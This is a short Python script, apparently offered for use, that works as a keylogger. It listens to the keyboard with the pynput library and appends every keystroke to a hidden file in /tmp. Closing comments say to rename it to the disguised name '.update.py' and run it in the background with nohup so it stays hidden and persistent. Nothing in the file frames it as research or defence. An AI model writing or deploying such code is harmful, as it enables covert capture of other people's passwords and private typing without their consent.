from pynput.keyboard import Listener
import os

log_file = "/tmp/.keylog.txt"

if not os.path.exists(log_file):
    open(log_file,"w").close()

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

with Listener(on_press=on_press) as listener:
    listener.join()

#mv keylogger.py .update.py
#nohup python .update.py &

